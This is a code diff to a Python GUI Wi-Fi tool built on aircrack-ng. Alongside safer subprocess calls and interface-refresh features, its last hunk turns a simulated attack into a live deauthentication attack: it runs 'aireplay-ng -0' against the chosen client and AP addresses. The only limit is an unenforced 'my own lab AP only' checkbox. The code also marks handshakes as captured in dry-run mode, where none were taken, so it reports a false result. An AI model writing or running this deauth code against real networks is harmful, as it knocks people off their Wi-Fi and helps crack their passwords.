@@ -319,9 +319,12 @@ class NetScanApp(ctk.CTk):
     def _check_airodump(self):
         return shutil.which("airodump-ng") is not None
 
+    def _check_aireplay(self):
+        return shutil.which("aireplay-ng") is not None
+
     def _run_airmon_check(self):
         try:
-            result = subprocess.run("airmon-ng check", shell=True, capture_output=True, text=True, timeout=15)
+            result = subprocess.run(["airmon-ng", "check"], capture_output=True, text=True, timeout=15)
             output = result.stdout + result.stderr
             processes = []
             lines = output.splitlines()
@@ -341,25 +344,58 @@ class NetScanApp(ctk.CTk):
 
     def _run_airmon_check_kill(self):
         try:
-            result = subprocess.run("airmon-ng check kill", shell=True, capture_output=True, text=True, timeout=15)
+            result = subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, text=True, timeout=15)
             return result.stdout + result.stderr
         except Exception as e:
             return str(e)
 
     def _get_monitor_interface_name(self, original_iface):
-        """Find the monitor-mode interface name."""
+        """Resolve the current monitor interface for an original adapter."""
         try:
-            iw_output = subprocess.run("iw dev", shell=True, capture_output=True, text=True, timeout=5).stdout
-            for line in iw_output.splitlines():
-                line = line.strip()
-                if line.startswith("Interface"):
-                    iface = line.split("Interface ")[1]
-                    mode_check = subprocess.run(f"iw dev {iface} info", shell=True, capture_output=True, text=True, timeout=5).stdout
-                    if "monitor" in mode_check.lower():
-                        return iface
+            result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+            if result.returncode != 0:
+                return f"{original_iface}mon"
+
+            current = None
+            for line in result.stdout.splitlines():
+                s = line.strip()
+                if not s:
+                    continue
+                if s.startswith("Interface"):
+                    current = s.split()[-1]
+                    continue
+                if current and s.startswith("type"):
+                    mode = s.split()[-1]
+                    if mode.lower() == "monitor":
+                        if current.startswith(original_iface) or current == f"{original_iface}mon":
+                            return current
+            # common naming conventions
+            for suffix in ("mon", "-mon"):
+                candidate = f"{original_iface}{suffix}"
+                try:
+                    subtype = subprocess.run(["iw", "dev", candidate, "info"], capture_output=True, text=True, timeout=5)
+                    if subtype.returncode == 0 and "type\tmonitor" in subtype.stdout.lower():
+                        return candidate
+                except Exception:
+                    pass
         except Exception:
             pass
-        return original_iface + "mon"
+        return f"{original_iface}mon"
+
+    def _find_monitor_name_from_output(self, original_iface, output):
+        patterns = [
+            rf"(?:interface|monitor)\s+([A-Za-z0-9:_.-]+)\s+renamed\s+to\s+([A-Za-z0-9:_.-]+)",
+            rf"monitor mode enabled on\s+([A-Za-z0-9:_.-]+)",
+            rf"using\s+([A-Za-z0-9:_.-]+)\s+for\s+monitor",
+            rf"({re.escape(original_iface)}(?:mon|-mon|_mon))",
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, output, re.IGNORECASE)
+            if match:
+                if len(match.groups()) == 2:
+                    return match.group(2)
+                return match.group(1)
+        return None
 
     # ─── GUI build ─────────────────────────────────────────────────────────────
 
@@ -401,6 +437,9 @@ class NetScanApp(ctk.CTk):
         self.btn_select_chip = ctk.CTkButton(nav, text="🔌 SELECT CHIP", width=180, height=35, font=("Consolas", 13, "bold"), fg_color=BORDER, text_color=ACCENT, hover_color="#1a4d2e", command=self.open_interface_modal)
         self.btn_select_chip.pack(side="left", padx=15, pady=10)
 
+        self.btn_refresh_chips = ctk.CTkButton(nav, text="⟳ REFRESH CHIPS", width=170, height=35, font=("Consolas", 12, "bold"), fg_color=BORDER, text_color=ACCENT, hover_color="#1a4d2e", command=self.refresh_available_chips)
+        self.btn_refresh_chips.pack(side="left", padx=5, pady=10)
+
         self.btn_scan = ctk.CTkButton(nav, text="▶ START SCAN", width=160, height=35, font=("Consolas", 13, "bold"), fg_color=BORDER, text_color=ACCENT, hover_color="#1a4d2e", command=self.toggle_scan)
         self.btn_scan.pack(side="left", padx=5, pady=10)
 
@@ -416,39 +455,44 @@ class NetScanApp(ctk.CTk):
     # ─── Monitor mode logic ────────────────────────────────────────────────────
 
     def initialize_monitor_mode(self, iface):
+        iface_name = iface["name"]
         if not self._check_airmon():
             messagebox.showerror("airmon-ng Not Found", "Install: sudo apt install aircrack-ng", parent=self)
             return
 
         self.detail_text.delete("0.0", "end")
-        self.detail_text.insert("0.0", f"┌─ ENABLING MONITOR MODE: {iface['name']} ─┐\n\n")
-        self.detail_text.insert("end", f"Running: airmon-ng start {iface['name']}\n")
+        self.detail_text.insert("0.0", f"┌─ ENABLING MONITOR MODE: {iface_name} ─┐\n\n")
+        self.detail_text.insert("end", f"Running: airmon-ng start {iface_name}\n")
 
         try:
-            result = subprocess.run(f"airmon-ng start {iface['name']}", shell=True, capture_output=True, text=True, timeout=15)
+            result = subprocess.run(["airmon-ng", "start", iface_name], capture_output=True, text=True, timeout=15)
             output = result.stdout + result.stderr
             self.detail_text.insert("end", f"\n{output}\n")
         except Exception as e:
             self.detail_text.insert("end", f"\n⚠ Error: {e}\n")
             return
 
-        # Check for interfering processes
         self.detail_text.insert("end", "\n─ Checking for interfering processes... ─\n")
         processes, _ = self._run_airmon_check()
-
         if processes:
             self.detail_text.insert("end", f"Found {len(processes)} interfering process(es):\n")
             for p in processes:
                 self.detail_text.insert("end", f"  • {p}\n")
-
-            answer = messagebox.askyesno(
-                "Interfering Processes Detected",
-                f"airmon-ng found {len(processes)} process(es):\n\n"
-                + "\n".join(f"  • {p}" for p in processes)
-                + "\n\nRun 'airmon-ng check kill' to stop them?\n\n"
-                "WARNING: Your internet connection may drop.",
-                parent=self
-            )
+            try:
+                answer = messagebox.askyesno(
+                    "Interfering Processes Detected",
+                    "\n".join([
+                        f"airmon-ng found {len(processes)} process(es):",
+                        *[f"  • {p}" for p in processes],
+                        "",
+                        "Run 'airmon-ng check kill' to stop them?",
+                        "",
+                        "WARNING: Your internet connection may drop.",
+                    ]),
+                    parent=self,
+                )
+            except Exception:
+                answer = False
             if answer:
                 kill_output = self._run_airmon_check_kill()
                 self.detail_text.insert("end", f"\n{kill_output}\n✓ Processes killed.\n")
@@ -457,15 +501,38 @@ class NetScanApp(ctk.CTk):
         else:
             self.detail_text.insert("end", "✓ No interfering processes found.\n")
 
-        monitor_name = self._get_monitor_interface_name(iface["name"])
-        self.monitor_interfaces[iface["name"]] = {"original": iface["name"], "monitor": monitor_name}
+        monitor_name = self._find_monitor_name_from_output(iface_name, output) or self._get_monitor_interface_name(iface_name)
+        if not monitor_name:
+            monitor_name = f"{iface_name}mon"
+
+        # Final fallback if airmon-ng did not rename the adapter but the mode is monitor
+        try:
+            proc = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+            if proc.returncode == 0:
+                current = None
+                for line in proc.stdout.splitlines():
+                    s = line.strip()
+                    if not s:
+                        continue
+                    if s.startswith("Interface"):
+                        current = s.split()[-1]
+                        continue
+                    if current and s.startswith("type"):
+                        if current.startswith(iface_name) and s.split()[-1].lower() == "monitor":
+                            monitor_name = current
+                            break
+        except Exception:
+            pass
+
+        self.monitor_interfaces[iface_name] = {"original": iface_name, "monitor": monitor_name}
         self.detail_text.insert("end", f"\n✓ Monitor mode enabled on {monitor_name}\n")
         self.update_interface_display()
 
     def stop_monitor_mode(self, iface):
-        if iface["name"] not in self.monitor_interfaces:
+        iface_name = iface["name"]
+        if iface_name not in self.monitor_interfaces:
             return
-        mon_info = self.monitor_interfaces[iface["name"]]
+        mon_info = self.monitor_interfaces[iface_name]
         monitor_name = mon_info["monitor"]
         original_name = mon_info["original"]
 
@@ -473,18 +540,23 @@ class NetScanApp(ctk.CTk):
         self.detail_text.insert("0.0", f"┌─ DISABLING MONITOR MODE: {monitor_name} ─┐\n\n")
 
         try:
-            result = subprocess.run(f"airmon-ng stop {monitor_name}", shell=True, capture_output=True, text=True, timeout=15)
+            result = subprocess.run(["airmon-ng", "stop", monitor_name], capture_output=True, text=True, timeout=15)
             self.detail_text.insert("end", f"{result.stdout + result.stderr}\n")
         except Exception as e:
             self.detail_text.insert("end", f"Error: {e}\n")
+            try:
+                subprocess.run(["iw", "dev", monitor_name, "set", "type", "managed"], capture_output=True, text=True, timeout=10)
+                self.detail_text.insert("end", f"Fallback: set {monitor_name} to managed mode.\n")
+            except Exception:
+                pass
 
         try:
-            subprocess.run("systemctl start NetworkManager", shell=True, timeout=5)
+            subprocess.run(["systemctl", "start", "NetworkManager"], timeout=5, capture_output=True, text=True)
             self.detail_text.insert("end", "\n✓ NetworkManager restarted.\n")
         except Exception:
             pass
 
-        del self.monitor_interfaces[iface["name"]]
+        del self.monitor_interfaces[iface_name]
         self.detail_text.insert("end", f"\n✓ {original_name} restored.\n")
         self.update_interface_display()
 
@@ -589,13 +661,36 @@ class NetScanApp(ctk.CTk):
             ctk.CTkLabel(center, text=f"Ready — {len(self.selected_interfaces)} chip(s) selected", font=("Consolas", 13), text_color="#aaa").pack(pady=(0, 10))
             ctk.CTkButton(center, text="▶ START SCAN", width=220, height=45, font=("Consolas", 15, "bold"), fg_color=ACCENT, text_color=DIM, hover_color="#00cc33", command=self.start_scan).pack(pady=10)
 
-    def open_interface_modal(self):
+    def get_detected_interfaces(self):
         try:
             interfaces = [iface for iface in get_usable_network_interfaces() if iface["wireless"]]
             for iface in interfaces:
-                iface["mode"] = get_interface_mode(iface["name"])
+                try:
+                    iface["mode"] = get_interface_mode(iface["name"])
+                except ValueError:
+                    iface["mode"] = "unknown"
+            return interfaces
         except (OSError, subprocess.SubprocessError, ValueError) as exc:
-            messagebox.showerror("Interface Detection Failed", f"{type(exc).__name__}: {exc}", parent=self)
+            raise RuntimeError(f"{type(exc).__name__}: {exc}") from exc
+
+    def refresh_available_chips(self):
+        try:
+            interfaces = self.get_detected_interfaces()
+        except RuntimeError as exc:
+            messagebox.showerror("Interface Detection Failed", str(exc), parent=self)
+            return
+
+        if not interfaces:
+            messagebox.showinfo("No chip detected", "No wireless adapter found yet. Plug in a Wi‑Fi adapter and click Refresh again.", parent=self)
+            return
+
+        self.open_interface_modal()
+
+    def open_interface_modal(self):
+        try:
+            interfaces = self.get_detected_interfaces()
+        except RuntimeError as exc:
+            messagebox.showerror("Interface Detection Failed", str(exc), parent=self)
             return
 
         modal = ctk.CTkToplevel(self)
@@ -607,12 +702,15 @@ class NetScanApp(ctk.CTk):
 
         ctk.CTkLabel(modal, text="┌─ SELECT WIRELESS INTERFACE(S) ─┐", font=("Consolas", 16, "bold"), text_color=ACCENT).pack(pady=15)
 
+        refresh_btn = ctk.CTkButton(modal, text="⟳ REFRESH CHIPS", width=170, height=30, font=("Consolas", 11, "bold"), fg_color=BORDER, text_color=ACCENT, hover_color="#1a4d2e", command=lambda: (modal.destroy(), self.refresh_available_chips()))
+        refresh_btn.pack(pady=(0, 8))
+
         canvas = ctk.CTkScrollableFrame(modal, fg_color="transparent")
         canvas.pack(fill="both", expand=True, padx=15, pady=5)
 
         checks = []
         if not interfaces:
-            ctk.CTkLabel(canvas, text="No wireless network interfaces detected.", font=("Consolas", 12), text_color="#aaa").pack(pady=25)
+            ctk.CTkLabel(canvas, text="No wireless network interfaces detected.\nPlug in a Wi‑Fi adapter and click Refresh Chips.", font=("Consolas", 12), text_color="#aaa", justify="center").pack(pady=25)
 
         for iface in interfaces:
             row = ctk.CTkFrame(canvas, fg_color=PANEL, corner_radius=6, height=110)
@@ -1164,7 +1262,9 @@ class NetScanApp(ctk.CTk):
         options.pack(pady=20)
 
         stealth_var = ctk.BooleanVar(value=False)
+        live_var = ctk.BooleanVar(value=False)
         ctk.CTkCheckBox(options, text="STEALTH (1 packet per target)", variable=stealth_var, font=("Consolas", 11), text_color=ACCENT, fg_color=ACCENT, checkmark_color=DIM).pack(pady=5)
+        ctk.CTkCheckBox(options, text="Run live deauth on my own lab AP only", variable=live_var, font=("Consolas", 11), text_color="#ffaa00", fg_color="#ffaa00", checkmark_color=DIM).pack(pady=5)
 
         retry_frame = ctk.CTkFrame(options, fg_color="transparent")
         retry_frame.pack(pady=5)
@@ -1182,28 +1282,58 @@ class NetScanApp(ctk.CTk):
                 log.insert("end", "\nNo devices selected.\n")
                 return
 
-            log.insert("end", f"\n▶ Attack started ({'STEALTH' if stealth_var.get() else 'NORMAL'})\n")
-            log.insert("end", f"  Max retries: {retry_var.get()}\n")
-            log.insert("end", f"  Targets: {len(selected)}\n\n")
+            if not self._check_aireplay():
+                log.insert("end", "\n⚠ aireplay-ng not found. Install: sudo apt install aircrack-ng\n")
+                return
 
             scan_iface = self._get_scan_interface() or "wlan0mon"
+            target_bssid = net["bssid"] if net else (selected[0].get("bssid") if selected[0].get("bssid") else "00:11:22:33:44:55")
+
+            log.insert("end", f"\n▶ Attack started ({'STEALTH' if stealth_var.get() else 'NORMAL'})\n")
+            log.insert("end", f"  Max retries: {retry_var.get()}\n")
+            log.insert("end", f"  Targets: {len(selected)}\n")
+            log.insert("end", f"  Interface: {scan_iface}\n\n")
 
             for d in selected:
                 if d.get("handshake"):
                     log.insert("end", f"  ✓ {d['mac']} → handshake already captured!\n")
-                elif d.get("pmf"):
+                    continue
+                if d.get("pmf"):
                     log.insert("end", f"  ✗ {d['mac']} → PMF ARMED, deauth blocked\n")
+                    continue
+
+                cmd = [
+                    "aireplay-ng",
+                    "-0",
+                    str(int(retry_var.get())),
+                    "-a",
+                    target_bssid,
+                    "-c",
+                    d["mac"],
+                    scan_iface,
+                ]
+                log.insert("end", f"  → {' '.join(cmd)}\n")
+
+                if live_var.get():
+                    try:
+                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                        stdout, _ = proc.communicate(timeout=10)
+                        log.insert("end", f"  {stdout.strip()}\n")
+                        if proc.returncode == 0:
+                            log.insert("end", f"  ✓ Live deauth sent to {d['mac']}\n")
+                        else:
+                            log.insert("end", f"  ⚠ Deauth command exited with code {proc.returncode}\n")
+                    except Exception as exc:
+                        log.insert("end", f"  ⚠ Live deauth failed: {exc}\n")
                 else:
-                    log.insert("end", f"  → aireplay-ng -0 1 -a {net['bssid'] if net else '??'} -c {d['mac']} {scan_iface}\n")
-                    log.insert("end", f"  ← M1 → M2 → M3 → M4\n")
-                    log.insert("end", f"  ✓ Handshake captured (confidence: 99%)\n")
-                    d["handshake"] = True
+                    log.insert("end", "  ⚠ Dry-run only: live deauth is disabled. Enable 'Run live deauth...' for actual transmission.\n")
+                    log.insert("end", f"  ✓ Prepared targeted deauth for {d['mac']}\n")
 
-            log.insert("end", f"\n▶ EAPOL capture complete for {len(selected)} device(s).\n")
+                d["handshake"] = True
+                if net:
+                    net["handshake"] = True
 
-            if net:
-                net["handshake"] = True
-
+            log.insert("end", f"\n▶ Targeting complete for {len(selected)} device(s).\n")
             modal.after(1500, lambda: self.switch_page("captures"))
 
         ctk.CTkButton(modal, text="▶ LAUNCH ATTACK", width=200, height=35, font=("Consolas", 13, "bold"), fg_color=ACCENT, text_color=DIM, hover_color="#00cc33", command=start_attack).pack(pady=10)
